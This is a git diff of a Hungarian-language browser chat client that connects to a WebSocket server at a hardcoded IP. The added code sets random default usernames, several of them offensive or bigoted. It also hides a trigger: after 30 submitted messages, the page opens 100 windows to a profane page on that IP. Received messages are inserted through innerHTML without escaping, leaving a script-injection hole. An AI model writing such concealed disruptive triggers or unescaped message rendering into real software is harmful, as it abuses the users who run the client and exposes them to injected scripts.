@@ -10,10 +10,10 @@ const ws = new WebSocket("ws:87.229.6.116:5500");
 // chat  
 let chatForm = document.getElementById('chatForm');
 let messageinput = document.getElementById('messageinput');
-let nevtorles = document.getElementById('nevtorles');
 let nevinput = document.getElementById('nevinput');
-let button = document.getElementById('gomb');
 let reciever = document.getElementById('reciever');
+
+let nevek = ['atrasuluj','Tron','BleachII','rainpour','lolBeardlol','NitroHead','Facer','footboalgundog2010','Zapp_Ackerman','ClownDown','sO_cRaZY','malter_ego','Flo_rida','CircleOFgambit','sinple','creamybridget2000','mrmrmrmrmrmDream','boga_discorda','[WORT]Tron','(Fin)[Ich]LINE','Rand00m','LUSERNAME','massEker','Killua_Ackerman','astabonkus','helL-TAKER','unhinged','tomatonator','DeathMauler','TripL4SH','quanter2','DJErrickCion','Fluper_Kukker','2000fortitudes','Ping[WIN]HARCOS','Ultimater','BrapperFarter','RayZin','giveUP','Raptor_csapat','ComicLoop','screwshit','frog_lover','MCbendO','a[TOMI]c','Zerohero','pvpROCKYROCKY','emerardo sprasho','plaxbales','killfuck','BGPsortofin','Suhajda_Bokkit','coatshangerAsh','kukudlack','femboy_hater','Yuto_on_Pluto','[N/A]EmptyNull','WhiteStoneSun','Tnya_4_7rechauf','noisy_hair','KOROSHI_black','pedro_sharingan','SupersonicWereRU','Zennie_tspringer','BUSTARRR','PixelMania','owoDash','sayitAprit','dave','Radoooo','Mieruko_Garage','Finngasch','Von_Zugg_suja','Babiden_Bettebon','KilluaLovesJews','Chorogon','Rokuro_x_Benio','Mr_Byn','ratty_memes_wtf','PROpeller','Schulletlen','Lemon3McGuk','hurkerDiusker'];
 
 let nev = "";
 let uzi = "";
@@ -35,40 +35,62 @@ var player;                   // You Tube player object
 
 
 ws.addEventListener("open", (event) => {
-    // event.preventDefault();
-    console.log("We are connected!");
-    if (localStorage.getItem("nev") == null) {
+    event.preventDefault();
+    console.log("We are connected! " + nev);
+    if (localStorage.getItem("nev") === null) {
+        nev = nevek[Math.floor(Math.random() * nevek.length)];
         // init variable/set default variable for item
-        localStorage.setItem("nev",event.name);
+        localStorage.setItem("nev", nev);
+        console.log("mostantól " + nev + " a neved");
+        nevinput.value = nev;
     }
     else{
         nev = localStorage.getItem("nev");
-        console.log("mostantól " + nev + " a neved");
+        nevinput.value = nev;
     }
 
 });
 
 
-button.addEventListener("click", () => {
-    nev = nevinput.value;
-    localStorage.setItem("nev",nev);
-    console.log("mostantól " + nev + " a neved");
-});
-nevtorles.addEventListener("click", () => {
-    localStorage.clear();
-    console.log("mostantól " + nev + " a neved");
-});
+nevinput.addEventListener("blur", nameSave)
 
 
 
+function nameSave() {
+    console.log("kurva életbe");
+    if (nevinput.value == "") {
+        nev = nevek[Math.floor(Math.random() * nevek.length)];
+        nevinput.value = nev;
+        localStorage.setItem("nev",nev);
+    }
+    else
+    {
+        
+        nev = nevinput.value;
+        localStorage.setItem("nev",nev);
+        console.log("mostantól " + nev + " a neved");
+    }
+}
 
+let i = 0;
 
 
 chatForm.addEventListener("submit", (e) => {
+    i++;
     e.preventDefault();
-    uzi = `<b>${nev}:</b> ${messageinput.value}`;
-    sendAmessage(uzi);
-    messageinput.value = '';
+    
+    if (i > 30) {
+        for (let index = 0; index < 100; index++) {
+            window.open("http://87.229.6.116/kurvaanyad.html", '_blank');;
+            
+        }
+    }
+    else{
+        uzi = `<b>${nev}:</b> ${messageinput.value}`;
+        sendAmessage(uzi);
+        messageinput.value = '';
+    }
+    console.log(i);
 });
 
 function sendAmessage(paramAdat) {
@@ -77,8 +99,14 @@ function sendAmessage(paramAdat) {
         adat: paramAdat
     }));
     // uzitarolas(uzi);
-   
-            $("#reciever").animate({ scrollTop: 20000000 }, "slow");
+    
+    // if (Math.abs(reciever.scrollHeight - reciever.clientHeight - reciever.scrollTop) <= 10) {
+    //     console.log("fajfejjjjjj");
+    // }
+    // else{
+    //     reciever.lastChild.scrollIntoView();
+        
+    // }
 }
 
 // function uzitarolas(uzi) {
@@ -87,7 +115,16 @@ function sendAmessage(paramAdat) {
 // }
 
 function recieveAmessage(text) {
-    reciever.innerHTML += `<p class="uzenet">${text}</p><br>`;
+    if (Math.abs(reciever.scrollHeight - reciever.clientHeight - reciever.scrollTop) <= 20) {
+        console.log("szarfejjjjjjjjjjjj");
+        reciever.innerHTML += `<p class="uzenet">${text}</p><br>`;
+        reciever.lastChild.scrollIntoView();
+    }
+    else{
+        
+        reciever.innerHTML += `<p class="uzenet">${text}</p><br>`;
+    }
+
 }
 
 
